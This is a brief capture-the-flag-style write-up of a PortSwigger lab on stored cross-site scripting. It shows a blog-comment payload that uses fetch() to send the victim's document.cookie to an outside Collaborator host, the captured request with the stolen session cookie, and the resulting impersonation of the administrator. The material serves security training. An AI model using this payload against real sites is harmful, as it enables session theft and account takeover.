# [Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

## Lab

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

## Analysis

post a simple comment:

```html
'"<script>alert(3)</script>
```

reload page and alert() popup

## Solutions

comment's body:

```html
'"<script>
fetch('https://efx0n599cnx0wyhxl9c3nbcfy64xsngc.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

- no-cors: Prevents the method from being anything other than HEAD, GET or POST, and the headers from being anything other than simple headers. If any ServiceWorkers intercept these requests, they may not add or override any headers except for those that are simple headers.

wait, check a http request coming to collaborator:

```http
POST / HTTP/1.1
Host: efx0n599cnx0wyhxl9c3nbcfy64xsngc.oastify.com

secret=LOxSC0B8aPo3Yr74WqgqH547r6RDyzkB; session=B0aYoODiEDh3Qp4JkQSy2ROTITI5OLlO
```

update session, go to my-account page: `Your username is: administrator` => lab solved
